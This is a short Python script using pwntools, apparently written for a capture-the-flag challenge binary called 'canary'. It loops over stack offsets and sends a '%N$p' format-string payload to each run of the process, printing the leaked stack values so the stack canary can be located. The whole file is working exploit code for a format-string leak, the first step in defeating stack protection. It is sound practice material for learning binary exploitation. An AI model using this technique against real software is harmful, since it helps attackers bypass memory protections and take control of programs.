from pwn import *

elf = context.binary = ELF('./canary', checksec=False)

for i in range(50):
    try:
        p = process(level='error')
        p.sendlineafter("You'll never beat my state of the art stack protector!", '%{}$p'.format(i).encode())
        p.recvline()

        result = p.recvline().decode()

        if result:
            print(str(i) + ': ' + str(result).strip())

    except EOFError:
        pass
